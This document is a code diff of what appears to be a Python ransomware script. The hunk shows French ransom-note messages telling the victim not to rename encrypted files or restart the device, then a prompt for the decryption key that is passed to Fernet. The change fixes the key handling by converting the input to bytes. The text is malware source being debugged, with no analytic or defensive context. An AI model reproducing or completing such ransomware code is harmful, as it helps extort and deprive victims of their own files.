@@ -99,7 +99,7 @@ while True:
     print(f"\n\t\t{RED}AVERTISSEMENT::{RESET}")
     print("\t\t\t[+] Ne renommez pas ou ne modifiez pas les fichiers cryptés.\n\t\t    [+] N'arrêtez pas ou ne redémarrez pas votre appareil car vous nerécupérerez\n\t\t       jamais vos fichiers.\n\t\t    [+] N'entrez aucune clé, nous ne sommes pas responsables de vos propres actions.\n\n")
     print(f"\t\t{GREEN}VEILLEZ ENTREZ LA CLÉ DE DECHIFFREMENT{RESET}")
-    key2 = input(f"\tKEY : {ORANGE} ")
+    key2 = bytes(input(f"\tKEY : {ORANGE} "), "utf-8")
 
     try:
         fn = Fernet(key2)
